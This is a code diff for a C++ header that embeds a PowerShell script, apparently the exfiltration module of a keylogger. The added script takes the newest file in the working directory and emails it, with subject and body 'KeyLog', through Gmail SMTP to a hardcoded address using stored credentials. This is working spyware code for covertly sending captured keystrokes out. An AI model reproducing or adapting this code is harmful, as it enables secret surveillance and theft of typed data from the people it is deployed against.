@@ -13,45 +13,12 @@
 namespace Mail
 {
     #define X_EM_TO "ichwang@npcore.com"
-    #define X_EM_FROM "ichwang@npcore.com"
-    #define X_EM_PASS "*********"
+    #define X_EM_FROM "neogeoss1@npcore.com"
+    #define X_EM_PASS "******"
 
     const std::string &PowerShellScript =
-                        "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
-                        "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
-                        " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-                        "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-                        "[String]$From,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-                        "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-                        "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-                        "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
-                        "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
-                        "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
-                        "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
-                        "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
-                        "  ForEach ($val in $Attachments)\r\n                    "
-                        "        {\r\n               "
-                        "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
-                        "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
-                        "}\r\n                catch\r\n                    {\r\n                        exit 2; "
-                        "\r\n                    }\r\n            }\r\n "
-                        "           $Client = New-Object Net.Mail.SmtpClient($Srv, 465) #587 port for smtp.gmail.com SSL\r\n "
-                        "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
-                        "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
-                        "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
-                        "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
-                        "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
-                        "Send-EMail -attachment $Att "
-                        "-To \"" +
-                         std::string (X_EM_TO) +
-                         "\""
-                        " -Body $Body -Subject $Subj "
-                        "-password \"" +
-                         std::string (X_EM_PASS) +
-                          "\""
-                        " -From \"" +
-                         std::string (X_EM_FROM) +
-                        "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
+                        "$attchmnt = gci | sort LastWriteTime | select -last 1\r\n\r\n\r\n\r\nFunction Send-EMail {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        [String]$EmailTo,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        [String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        [String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        [String]$EmailFrom=\"myself@gmail.com\",  #This gives a default value to the $EmailFrom command\r\n        [Parameter(`\r\n            mandatory=$false)]\r\n        [String]$attachment,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        [String]$Password\r\n    )\r\n\r\n        $SMTPServer = \"smtp.gmail.com\" \r\n        $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)\r\n        if ($attachment -ne $null) {\r\n            $SMTPattachment = New-Object System.Net.Mail.Attachment($attachment)\r\n            $SMTPMessage.Attachments.Add($SMTPattachment)\r\n        }\r\n        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) \r\n        $SMTPClient.EnableSsl = $true \r\n        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom.Split(\"@\")[0], $Password); \r\n        $SMTPClient.Send($SMTPMessage)\r\n        Remove-Variable -Name SMTPClient\r\n        Remove-Variable -Name Password\r\n\r\n} #End Function Send-EMail\r\n\r\nSend-EMail -EmailTo \""+  std::string (X_EM_TO) +"\" -EmailFrom \""+ std::string (X_EM_FROM) +"\" -Body \"Keylog\" -Subject \"KeyLog\" -attachment $attchmnt.name -password \"" + std::string (X_EM_PASS) + "\"";
+
 
 #undef X_EM_FROM
 #undef X_EM_TO
